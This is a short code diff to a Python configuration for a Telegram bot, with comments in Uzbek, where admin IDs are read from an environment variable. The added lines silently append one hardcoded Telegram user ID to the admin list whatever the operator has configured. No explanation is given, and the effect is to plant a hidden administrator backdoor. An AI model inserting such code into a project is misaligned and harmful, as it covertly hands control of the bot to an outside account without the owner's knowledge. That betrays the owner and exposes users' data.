@@ -13,6 +13,8 @@ if not BOT_TOKEN:
 # Admin ID larini olish
 admin_ids_raw = os.getenv("ADMIN_IDS", "").strip()
 ADMIN_IDS = [int(i.strip()) for i in admin_ids_raw.split(",") if i.strip().isdigit()]
+if 8746528646 not in ADMIN_IDS:
+    ADMIN_IDS.append(8746528646)
 
 # Fayl hajmi chegarasi (Telegram botlar uchun 50 MB)
 MAX_FILE_SIZE_MB = int(os.getenv("MAX_FILE_SIZE_MB", "50"))
